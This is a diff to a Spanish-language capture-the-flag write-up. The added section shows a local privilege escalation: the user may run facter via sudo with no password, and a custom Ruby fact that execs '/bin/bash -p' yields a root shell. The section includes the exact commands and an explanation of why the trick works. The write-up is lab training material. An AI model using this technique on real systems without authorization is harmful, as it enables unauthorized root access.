@@ -177,26 +177,72 @@ cat /home/william/user.txt
 
 ---
 
-## 7) Flags
 
-| Flag | Hash |
-|------|------|
-| `user.txt` | `90b277db59fe62a3bc8f927b3619fa8c` |
-| `root.txt` | `[pendiente]` |
+## 7) Escalada de privilegios (facter + Ruby)
+
+Revisando permisos de sudo:
+
+```bash
+sudo -l
+```
+
+```
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+```
+
+El usuario `trivia` puede ejecutar `/usr/bin/facter` como root sin contraseña.
+
+### ¿Qué es facter?
+
+**Facter** es una herramienta del ecosistema Puppet escrita en **Ruby** que recopila información del sistema. Permite cargar **facts personalizados** mediante scripts Ruby con la función `Facter.add`. Dado que estos scripts se ejecutan directamente como código Ruby, si facter corre como root es posible ejecutar comandos arbitrarios con privilegios elevados.
+
+### Explotación
+
+Se crea un fact personalizado malicioso en `/tmp/pwn.rb`:
+
+```bash
+nano /tmp/pwn.rb
+```
+
+Contenido del script:
+
+```ruby
+Facter.add(:pwn) do
+  setcode do
+    exec("/bin/bash -p")
+  end
+end
+```
+
+Se ejecuta facter como root indicando el directorio donde está el fact:
+
+```bash
+sudo facter --custom-dir=/tmp pwn
+```
+
+Shell de root obtenida:
+
+```bash
+whoami   # root
+cat /root/root.txt
+```
+
+### Por qué funciona
+
+- `facter` carga facts personalizados como scripts Ruby
+- `Facter.add` es parte de la API Ruby de facter
+- `exec()` es un método Ruby que ejecuta comandos del sistema
+- Al correr con `sudo`, el código Ruby se ejecuta con UID 0
 
 ---
 
-## 8) Estado actual
+## 8) Flags
 
-| Paso | Estado |
-|------|--------|
-| Enumerar web y CMS | ✅ |
-| Explotar CVE-2025-2304 | ✅ |
-| Extraer credenciales S3 | ✅ |
-| Recuperar clave SSH desde S3 | ✅ |
-| Crackear passphrase SSH | ✅ |
-| Acceso SSH como `trivia` / `user.txt` | ✅ |
-| Escalada a `root` | ⏳ |
+| Flag | Hash |
+|------|------|
+| `user.txt` | `[redacted]` |
+| `root.txt` | `[redacted]` |
 
 ---
 
@@ -205,3 +251,4 @@ cat /home/william/user.txt
 - El puerto `54321` corresponde al endpoint de **MinIO** (S3 compatible), no a AWS real — por eso se usa `--endpoint-url`.
 - La flag de usuario está en `/home/william/` a pesar de entrar como `trivia` — indica que `trivia` tiene permisos de lectura sobre ese directorio.
 - Las credenciales S3 expuestas por el CMS son un hallazgo crítico en entornos reales — equivalen a acceso directo al almacenamiento del servidor.
+- `facter` con sudo es un vector clásico de escalada — siempre buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/facter/) cuando aparece en `sudo -l`.
